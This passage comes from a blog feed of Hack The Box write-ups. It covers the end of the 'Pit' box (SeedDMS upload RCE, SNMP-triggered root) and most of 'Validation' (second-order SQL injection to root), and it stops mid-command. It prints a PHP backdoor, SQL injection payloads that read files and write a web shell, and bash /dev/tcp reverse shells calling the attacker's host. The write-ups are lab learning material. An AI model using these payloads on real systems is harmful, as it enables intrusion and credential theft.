/HDRS.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
<span class="o">===============================================================</span>
2021/05/20 15:22:45 <span class="nv">Finished</span>
<span class="o">===============================================================</span>
</code></pre></div><p>Poking <code>/CHANGELOG</code> with curl reveals the software version.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ curl -s http://dms-pit.htb/seeddms51x/seeddms/CHANGELOG  <span class="p">|</span> head 
--------------------------------------------------------------------------------
                     Changes in version 5.1.15
--------------------------------------------------------------------------------
- Improved import from file system
- HTTP Proxy <span class="k">for</span> access on external extension repository can be <span class="nb">set</span>
- Do not use unzip in ExtensionMgr anymore
- fix version compare on info page
- allow one page mode on search page
- fix import of older extension versions from repository
</code></pre></div><h4 id="searchsploit-1">Searchsploit</h4>
<p>I feed the version to <code>searchsploit</code>, and it returns with some potential exploits. There is one for RCE.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ searchsploit seeddms
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             <span class="p">|</span>  Path
--------------------------------------------------------------------------- ---------------------------------
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                           <span class="p">|</span> php/webapps/48324.txt
SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.GroupMgr.php&#39;</span> Cross-Site Scripting                 <span class="p">|</span> php/webapps/47024.txt
SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.UsrMgr.php&#39;</span> Cross-Site Scripting                   <span class="p">|</span> php/webapps/47023.txt
SeedDMS versions &lt; 5.1.11 - Remote Command Execution                       <span class="p">|</span> php/webapps/47022.txt
--------------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>The exploitation steps for the RCE vulnerability is as follow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]
</span><span class="err"># Google Dork: [NA]
</span><span class="err"># Date: [20-June-2019]
</span><span class="err"># Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
</span><span class="err"># Vendor Homepage: [https://www.seeddms.org]
</span><span class="err"># Software Link: [https://sourceforge.net/projects/seeddms/files/]
</span><span class="err"># Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)
</span><span class="err"># Tested on: [NA]
</span><span class="err"># CVE : [CVE-2019-12744]
</span><span class="err">
</span><span class="err">Exploit Steps:
</span><span class="err">
</span><span class="err">Step 1: Login to the application and under any folder add a document.
</span><span class="err">Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
</span><span class="err">
</span><span class="err">PHP Backdoor Code: 
</span><span class="err">&lt;?php
</span><span class="err">
</span><span class="err">if(isset($_REQUEST[&#39;cmd&#39;])){
</span><span class="err">        echo &#34;&lt;pre&gt;&#34;;
</span><span class="err">        $cmd = ($_REQUEST[&#39;cmd&#39;]);
</span><span class="err">        system($cmd);
</span><span class="err">        echo &#34;&lt;/pre&gt;&#34;;
</span><span class="err">        die;
</span><span class="err">}
</span><span class="err">
</span><span class="err">?&gt;
</span><span class="err">
</span><span class="err">Step 3: Now after uploading the file check the document id corresponding to the document.
</span><span class="err">Step 4: Now go to example.com/data/1048576/&#34;document_id&#34;/1.php?cmd=cat+/etc/passwd to get the command response in browser.
</span><span class="err">
</span><span class="err">Note: Here &#34;data&#34; and &#34;1048576&#34; are default folders where the uploaded files are getting saved.
</span></code></pre></div><p>I will need a valid credentials for RCE.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nginx">Shell as nginx</h3>
<h4 id="seeddms-dashboard">SeedDMS Dashboard</h4>
<p><code>admin:admin</code> are the default credentials for SeedDMS.</p>
<p><div class="img-container"><img src="imgs/image-20210521014957029.png" alt="image-20210521014957029"  /></div>
</p>
<p>But these creds didn&rsquo;t work here, so I submit <code>michelle:michelle</code>, and it logs me in 😮 !</p>
<p><div class="img-container"><img src="imgs/image-20210521023728548.png" alt="image-20210521023728548"  /></div>
</p>
<h4 id="seeddms-cve-2019-12744">SeedDMS CVE-2019-12744</h4>
<p>With a valid account, I can try to reproduce the exploitation steps for remote code execution.</p>
<p>First, I will create a document by navigating to <code>Docs &gt; Users &gt; Michelle</code> (folders), and then under <code>michelle</code> folder I will add a new document.</p>
<p><div class="img-container"><img src="imgs/image-20210521025006867.png" alt="image-20210521025006867"  /></div>
</p>
<p>On the local file menu, I will browse and upload my PHP web shell.</p>
<p><div class="img-container"><img src="imgs/image-20210521025924716.png" alt="image-20210521025924716"  /></div>
</p>
<p>And the file gets uploaded.</p>
<p><div class="img-container"><img src="imgs/image-20210521030038234.png" alt="image-20210521030038234"  /></div>
</p>
<p>According to the exploit author, the uploaded web shell should be available at  <code>http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id</code>, where <code>63</code> is my document ID, but I couldn&rsquo;t find it there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ curl -s <span class="s1">&#39;http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id&#39;</span>
File not found.
</code></pre></div><p>The web server somehow has a weird routing, so I downloaded the SeedDMS source code to figure out its folder structure, and it was on <code>http://dms-pit.htb/seeddms51x/data/1048576/64/1.php?f=id</code>!</p>
<p><div class="img-container"><img src="imgs/image-20210521031346742.png" alt="image-20210521031346742"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>I will send a bash reverse shell to get a foothold on the box.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">/bin/bash -c <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.49/53 0&gt;&amp;1&#34;</span>
</code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.241<span class="o">]</span> <span class="m">58888</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>26319<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
bash-4.4$ id
id
<span class="nv">uid</span><span class="o">=</span>992<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
</code></pre></div><p>&gt;&gt; I just read and watched other writeups, and they were unable to get a foothold. Not sure why, but I did.</p>
<p><div class="img-container"><img src="imgs/image-20210521034126889.png" alt="image-20210521034126889"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-michelle">Shell as michelle</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Searching for string &ldquo;pass&rdquo; under <code>/var/www/html/seeddms51x/conf</code> reveals the database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ <span class="nb">pwd</span>
<span class="nb">pwd</span>
/var/www/html/seeddms51x/conf
bash-4.4$  grep -Ri <span class="s2">&#34;pass&#34;</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
settings.xml:    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">&#34;mysql&#34;</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">&#34;ied^ieY6xoquu&#34;</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">&#34;false&#34;</span>&gt;
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>Under <code>/var/www/html/seeddms51x/data/conf</code> there is also another database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ <span class="nb">pwd</span>
<span class="nb">pwd</span>
/var/www/html/seeddms51x/data/conf
bash-4.4$ grep -Ri pass
...<span class="o">[</span>SNIP<span class="o">]</span>...
settings.xml:    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">&#34;sqlite&#34;</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">&#34;/home/www-data/seeddms51x/data/content.db&#34;</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">&#34;false&#34;</span>&gt;
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The password <code>ied^ieY6xoquu</code> is the one that valid, but I didn&rsquo;t find anything juicy in the database.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.4$ mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class="s1">&#39;show databases;&#39;</span>
mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class="s1">&#39;show databases;&#39;</span>
Database
information_schema
seeddms
</code></pre></div><h4 id="cockpit-tcp-9090">Cockpit (TCP 9090)</h4>
<p>Using <code>Michelle:ied^ieY6xoquu</code> on the Cockpit login page at <code>https://pit.htb:9090</code> logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210521063658472.png" alt="image-20210521063658472"  /></div>
</p>
<p>Cockpit gives terminal access through its web interface to communicate with the system. Because of SELinux, I couldn&rsquo;t get my reverse shell/SSH to work, so I will just use this terminal and grab the user flag.</p>
<p><div class="img-container"><img src="imgs/image-20210521064953236.png" alt="image-20210521064953236"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>For the SNMP enumeration, I will remember <code>/usr/bin/monitoring</code>, which turned out to be a bash script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ cat /usr/bin/monitor
<span class="c1">#!/bin/bash</span>

<span class="k">for</span> script in /usr/local/monitoring/check*sh
<span class="k">do</span>
    /bin/bash <span class="nv">$script</span>
<span class="k">done</span>
</code></pre></div><p>The script takes and executes other scripts under  <code>/usr/local/monitoring/</code> which filename begins with <code>check</code> and ends with <code>sh</code>  . If I try to list the content of that directory, it returns a permission denied error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ ls -l /usr/local/monitoring/
ls: cannot open directory <span class="s1">&#39;/usr/local/monitoring/&#39;</span>: Permission denied
</code></pre></div><p>But with <code>-ld</code>, it shows that the folder has extended permission, and user <code>michelle</code> is allowed to write a file under that directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ ls -ld /usr/local/monitoring/
drwxrwx---+ <span class="m">2</span> root root <span class="m">122</span> May <span class="m">20</span> 20:35 /usr/local/monitoring/
<span class="o">[</span>michelle@pit /<span class="o">]</span>$ getfacl /usr/local/monitoring/
getfacl: Removing leading <span class="s1">&#39;/&#39;</span> from absolute path names
<span class="c1"># file: usr/local/monitoring/</span>
<span class="c1"># owner: root</span>
<span class="c1"># group: root</span>
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---
</code></pre></div><h4 id="from-snmp-to-rce">From SNMP to RCE</h4>
<p>From the SNMP enumeration, each time an SNMP &ldquo;walk&rdquo; is performed,  <code>usr/bin/monitor</code> will always pop up in the <code>NET-SNMP-EXTEND-MIB</code> section.</p>
<p><div class="img-container"><img src="imgs/image-20210521075856288.png" alt="image-20210521075856288"  /></div>
</p>
<p>Based on the output above, and the following  <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending">documentation</a>, there is a chance that when a SNMP walk is performed, the Net-SNMP agent will also execute <code>/usr/bin/monitor</code>.</p>
<p><div class="img-container"><img src="imgs/image-20211013161852076.png" alt="image-20211013161852076"  /></div>
</p>
<p>So, the strategy here is that I can try to write a script and save it under  <code>/usr/local/monitoring/</code>. Then I will do a SNMP walk to trigger the Net-SNMP agent to execute <code>/usr/bin/monitor</code> which will then eventually execute the script I created.</p>
<p>Now I will write a script to <code>/usr/local/monitoring/</code> that will inject my SSH public key to the root&rsquo;s authorized_keys file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\nmkdir -p /root/.ssh/ 2&gt;/dev/null &amp;&amp; echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#34; &gt; /root/.ssh/authorized_keys&#39;</span> &gt; /usr/local/monitoring/check_iamf.sh
</code></pre></div><p>Then I will do another  SNMP walk and wait for it to finish, or at least get to the NET-SNMP-EXTEND-MIB output line.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ snmpwalk -v 2c -c public 10.10.10.241 internet
</code></pre></div><p>And now if I try to SSH login as root to Pit, it logs me in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ ssh root@10.10.10.241
Web console: https://pit.htb:9090/

Last login: Thu May <span class="m">20</span> 21:12:44 <span class="m">2021</span> from 10.10.14.49
<span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
<span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1"># ls -l</span>
total <span class="m">8</span>
-rwx------. <span class="m">1</span> root root <span class="m">706</span> Apr <span class="m">22</span>  <span class="m">2020</span> cleanup.sh
drwx------. <span class="m">2</span> root root <span class="m">122</span> Apr <span class="m">18</span>  <span class="m">2020</span> monitoring
lrwxrwxrwx. <span class="m">1</span> root root   <span class="m">9</span> May <span class="m">10</span> 11:07 null -&gt; /dev/null
-r--------. <span class="m">1</span> root root  <span class="m">33</span> May <span class="m">20</span> 02:00 root.txt
<span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1">#</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210521081359037.png" alt="image-20210521081359037"  /></div>
</p>
<blockquote>
<p>Phew, I didn&rsquo;t expect this writeup to be this long. 😅🔨</p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Validation</title>
      <link>https://fahmifj.github.io/hackthebox/validation/</link>
      <pubDate>Fri, 24 Sep 2021 19:11:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/validation/</guid>
      <description>Second-order SQL injection</description>
      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Validation">Validation</a>  is a machine from the UHC September qualifiers and is currently live on Hack The Box as a retired machine. It starts with enumeration on a website and identifying a second order SQL injection. The SQL user can use various SQL functions, two of which allow for file read and file write. The web configuration, which contains database credentials, can be read using the file read ability. With the file write ability and also write permission on the web root, it is possible to drop a web shell to gain a foothold on the system. For the root part, the password for the database is found to be re-used by the root account.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>SQL injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers 4 open ports: SSH on 22, three web servers on 80, 4566 (probably LocalStack), and 8080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
$ fscan 10.10.11.116 validation
nmap -p- 10.10.11.116 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 -sC -sV -oA nmap/all-tcp-ports-validation 10.10.11.116
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-22 16:46 EDT
Nmap scan report <span class="k">for</span> 10.10.11.116
Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.

PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open     http           Apache httpd 2.4.48 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.48 <span class="o">(</span>Debian<span class="o">)</span>
<span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
4566/tcp open     http           nginx
<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
<span class="p">|</span>_http-title: <span class="m">502</span> Bad Gateway
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.07 seconds
</code></pre></div><p>The filtered ports indicate that there are some firewall/IP table rules applied on the machine.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Port 80 presents a registration page of UHC. Adding <code>index.php</code> reveals that it&rsquo;s PHP site.</p>
<p><div class="img-container"><img src="imgs/image-20210923035321832.png" alt="image-20210923035321832"  /></div>
</p>
<p>I can register on it, and it redirects to <code>/account.php</code>. The submitted inputs (country and username) are reflected back here, and this can be an indicator for injection point.</p>
<p><div class="img-container"><img src="imgs/image-20210923040838459.png" alt="image-20210923040838459"  /></div>
</p>
<p>The HTTP request for register, which was previously intercepted using Burp Suite, is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>
<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">35</span>
<span class="n">Origin</span><span class="o">:</span> <span class="l">http://10.10.11.116</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.11.116/index.php</span>
<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>

username=choropys&amp;country=Indonesia
</code></pre></div><p>And the server responses with <code>302</code> which redirects to <code>/account.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="n">Date</span><span class="o">:</span> <span class="l">Wed, 22 Sep 2021 21:08:19 GMT</span>
<span class="n">Server</span><span class="o">:</span> <span class="l">Apache/2.4.48 (Debian)</span>
<span class="n">X-Powered-By</span><span class="o">:</span> <span class="l">PHP/7.4.23</span>
<span class="n">Set-Cookie</span><span class="o">:</span> <span class="l">user=f1bffe3047f1550d765a66e3ac54515c</span>
<span class="n">Location</span><span class="o">:</span> <span class="l">/account.php</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
</code></pre></div><p>The response also contains a cookie which is <code>md5sum</code> of the username.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
$ <span class="nb">echo</span> -n <span class="s1">&#39;choropys&#39;</span> <span class="p">|</span> md5sum                                                                 
f1bffe3047f1550d765a66e3ac54515c
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="sql-injection">SQL injection</h3>
<h4 id="detection">Detection</h4>
<p>I will submit another registration request with the following payload,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>

<span class="g">...[SNIP]...
</span><span class="g">
</span><span class="g">username=choropys&#39;&amp;country=Indonesia&#39;
</span></code></pre></div><p>Now when I navigate to <code>/account.php</code> with updated cookie, the page displays an error message.</p>
<p><div class="img-container"><img src="imgs/image-20210923041509664.png" alt="image-20210923041509664"  /></div>
</p>
<p>If I search for  <code>fetch_assoc()</code> on Google, it&rsquo;s a PHP function that typically used to handle database records.</p>
<p>Now if I change the <code>country</code>  value to <code>Indonesia' -- #</code> , the page doesn&rsquo;t error out. From here, I can assume that the site is vulnerable to SQL injection.</p>
<p><div class="img-container"><img src="imgs/image-20210923041604118.png" alt="image-20210923041604118"  /></div>
</p>
<p>I will submit <code>country=Indonesia'ORDER BY 1,2 -- #</code> to identify the number of available columns, and the <code>/account.php</code> page returns with the same error.</p>
<p><div class="img-container"><img src="imgs/image-20210923042953130.png" alt="image-20210923042953130"  /></div>
</p>
<p>So the query in the backend only wants a single column.</p>
<h4 id="leak-source">Leak source</h4>
<p>I couldn&rsquo;t find any credentials on the database, but I found out that the MySQL <code>load_file()</code> function isn&rsquo;t restricted. I can read the <code>/etc/passwd</code> file using that function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT load_file(&#39;/etc/passwd&#39;) -- #
</code></pre></div><p>When I refresh <code>/account.page</code></p>
<p><div class="img-container"><img src="imgs/image-20210923043603480.png" alt="image-20210923043603480"  /></div>
</p>
<p>Since the location of <code>account.php</code> has been leaked by the error message, I can try to load that file with <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>. When I refresh the <code>account.php</code> page and view its source, the source code of <code>account.php</code> is there, and it also leaks the configuration file.</p>
<p><div class="img-container"><img src="imgs/image-20210923044030733.png" alt="image-20210923044030733"  /></div>
</p>
<p>I can try to read <code>config.php</code> by changing my payload to <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>, and it reveals database credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210923044108761.png" alt="image-20210923044108761"  /></div>
</p>
<p>I will note these creds.</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="web-shell">Web shell</h4>
<p>I also find that writing files is allowed on <code>/var/www/html/</code>, therefore I could put a web shell there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT &#34;&lt;?php system($_REQUEST[c]); ?&gt;&#34; INTO OUTFILE &#34;/var/www/html/chrp.php&#34; -- #	
</code></pre></div><p>And now I have code execution.</p>
<p><div class="img-container"><img src="imgs/image-20210923045051661.png" alt="image-20210923045051661"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>The system does have bash, but my reverse shell doesn&rsquo;t work with the GET method, so I changed the request to use the POST method and URL encode the payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">c=/bin/bash+-c+&#34;/bin/bash+-i+&gt;%26+/dev/tcp/10.10.14.5/21+0&gt;%261&#34;
</code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
$ nc -nvlp <span class="m">21</span>                                                
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">21</span> ...
connect to <span class="o">[</span>10.10.14.5<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.116<span class="o">]</span> <span class="m">37096</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@validation:/var/www/html$ id 
id 
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div><p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/var/www/html$ which script
which script
/usr/bin/script
www-data@validation:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is <span class="s1">&#39;/dev/null&#39;</span>.
www-data@validation:/var/www/html$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> suspended  nc -nvlp <span class="m">21</span>
→ root@kali «exploits» «10.10.14.49» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> continued  nc -nvlp <span class="m">21</span>

www-data@validation:/var/www/html$ 
</code></pre></div><p>The root flag is readable by others, so I could grab it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/home/htb$ ls -lR /home
/home:
total <span class="m">4</span>
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">9</span> 12:09 htb

/home/htb:
total <span class="m">4</span>
-rw-r--r-- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 user.txt
</code></pre></div><p>I also noticed that I&rsquo;m inside a Docker container because there is <code>.dockerenv</code> at the root file system</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ ls -l .dockerenv
-rwxr-xr-x <span class="m">2</span> root root <span class="m">0</span> Sep <span class="m">16</span> 13:39 .dockerenv
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="su-root">su root</h4>
<p>In the previous enumeration using SQLi, I didn&rsquo;t see user <strong>htb</strong> listed in the <code>/etc/passwd</code> file, and it&rsquo;s only <strong>root</strong> that has a login shell. So I tried the database password I obtained from the <code>config.php</code> file on <strong>root</strong>, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ su -   
su -
Password: uhc-9qual-global-pw

root@validation:~# 
</code></pre></div><p>I thought I needed to escape from this container, but when I checked the <code>/root/</code> directory, the root flag was there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@validation:/# ls -l /root/root.txt 
